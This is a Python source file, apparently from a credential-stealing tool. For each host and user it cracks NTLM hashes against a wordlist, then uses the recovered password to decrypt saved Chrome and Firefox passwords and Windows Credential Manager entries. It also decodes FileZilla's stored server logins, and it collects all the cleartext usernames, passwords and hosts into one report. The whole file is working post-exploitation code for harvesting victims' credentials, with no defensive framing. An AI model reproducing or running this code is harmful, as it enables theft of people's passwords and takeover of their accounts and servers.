import os
import pathlib
from plugins.chrome_v80_password_offline import Chrome_decryptor
from plugins.firepwd import Firefox_decryptor
from Logger import Logger
import xml.etree.ElementTree as ET
import json
from passlib.hash import nthash
from base64 import b64decode
from plugins.creds import Creds


class Decrypt:
    def __init__(self, folder, book, standalone):
        super(Decrypt, self).__init__()
        self.__user_is_existed = None
        self.__path_user = None
        self.__hashes = None
        self.__User = None
        self.__folder = folder
        self.__book = book
        self.__logger = Logger(folder, standalone)
        self.__chrome_data = ''
        self.__FireFox_data = ''
        self.__FileZilla_data = ''
        self.__Creds_data = ''

    def Decryptor(self):
        for folders in os.listdir(self.__folder):
            if os.path.isdir(f'{self.__folder}/{folders}'):
                path_host = self.__folder + f'/{folders}/'
                with open(f'{path_host}hashes.txt', 'r', encoding='utf-8') as Json:
                    self.__hashes = json.loads(Json.read())
                self.__logger.logger([f'\nStarting decrypt data for host {folders}\n{"*" * 50}'])
                for folder in os.listdir(path_host):
                    if os.path.isdir(path_host + folder):
                        self.__path_user = path_host + folder
                        self.__User = folder
                        if self.__User in self.__hashes.keys():
                            self.__user_is_existed = True
                        else:
                            self.__user_is_existed = False
                        self.Chrome()
                        self.FireFox()
                        self.FileZilla()
                        self.Creds()
                self.__logger.logger([f'{"*" * 50}\n'])
        return f'Google chrome passwords\n{"*" * 50}\n{self.__chrome_data}{"*" * 50}\n' + f'\nFireFox passwords\n{"*" * 50}\n{self.__FireFox_data}{"*" * 50}\n' + f'\nFileZilla passwords\n{"*" * 50}\n{self.__FileZilla_data}{"*" * 50}\n' + f'\nCreds passwords\n{"*" * 50}\n{self.__Creds_data}{"*" * 50}\n'

    def Chrome(self):
        interrupt = False
        SSID = self.SSID()
        for i in os.listdir(f'{self.__path_user}/Chrome'):
            if os.path.isdir(f'{self.__path_user}/Chrome/{i}'):
                for g in SSID:
                    for k in self.__book:
                        try:
                            if nthash.hash(k) == self.__hashes[self.__User][33:]:
                                self.__chrome_data += Chrome_decryptor(f'{self.__path_user}/Chrome', i, g[1], k, g[0])
                                interrupt = True
                                break
                        except:
                            pass
                    if interrupt:
                        self.__logger.logger([f'Success decrypt chrome passwords for user {self.__User}'])
                        break
                if not interrupt:
                    if self.__user_is_existed:
                        self.__logger.logger([f'Error decrypt chrome passwords for user {self.__User}',
                                            f'Error decrypt chrome passwords for user {self.__User} (NTLM: {self.__hashes[self.__User][33:]})'])
                    else:
                        pass
                else:
                    interrupt = False

    def FireFox(self):
        interrupt = False
        for i in os.listdir(f'{self.__path_user}/FireFox'):
            if os.path.isdir(f'{self.__path_user}/FireFox/{i}'):
                for g in self.__book:
                    try:
                        self.__FireFox_data += Firefox_decryptor(g, f'{pathlib.Path().absolute()}/{self.__path_user}/FireFox/{i}')
                        interrupt = True
                        break
                    except:
                        pass
        if interrupt:
            self.__logger.logger([f'Success decrypt FileZilla passwords for user {self.__User}'])
        else:
            self.__logger.logger([f'Error decrypt FileZilla passwords for user {self.__User}',
                                  f'Error decrypt FileZilla passwords for user {self.__User}'])

    def SSID(self):
        SSID = list()
        for i in os.listdir(f'{self.__path_user}/user_ssid'):
            if os.path.isdir(f'{self.__path_user}/user_ssid/{i}'):
                SSID.append([i, f'{self.__path_user}/user_ssid/{i}'])
        return SSID

    def FileZilla(self):
        interrupt = False
        try:
            filezilla_xml = ET.parse(f'{self.__path_user}/FileZilla/recentservers.xml')
            root = filezilla_xml.getroot()
            for i in root[0]:
                if i.tag == 'Server' and i[4].tag == 'User' and i[5].tag == 'Pass':
                    self.__FileZilla_data += f'Host IP: {i[0].text}\nPort: {i[1].text}\nLogin: {i[4].text}\nPassword: {b64decode(i[5].text).decode("UTF-8")}\n\n'
                    if not interrupt:
                        interrupt = True
            if interrupt:
                self.__logger.logger([f'Success decrypt FileZilla passwords for user {self.__User}'])
            else:
                self.__logger.logger([f'Error decrypt FileZilla passwords for user {self.__User}',
                                      f'Error decrypt FileZilla passwords for user {self.__User}'])
        except:
            pass

    def Creds(self):
        interrupt = False
        for i in self.SSID():
            for g in self.__book:
                if self.__user_is_existed:
                    if nthash.hash(g) == self.__hashes[self.__User][33:]:
                        obj = Creds(i[0], g, i[1])
                        for k in os.listdir(f'{self.__path_user}/Creds'):
                            stat, raw = obj.decrypt_cred(f'{self.__path_user}/Creds/{k}')
                            if stat:
                                self.__Creds_data += f'{"*" * 50}\nURL: {raw["Domain"]}\nUser Name: {raw["Username"]}\nPassword: {raw["Password"]}\n'
                                if not interrupt:
                                    interrupt = True
        if interrupt:
            self.__logger.logger([f'Success decrypt Creds passwords for user {self.__User}'])
        else:
            if self.__user_is_existed:
                self.__logger.logger([f'Error decrypt Creds passwords for user {self.__User}',
                                  f'Error decrypt Creds passwords for user {self.__User} (NTLM: {self.__hashes[self.__User][33:]})'])
            else:
                self.__logger.logger([f'Error decrypt Creds passwords for user {self.__User}',
                                      f'Error decrypt Creds passwords for user {self.__User}'])

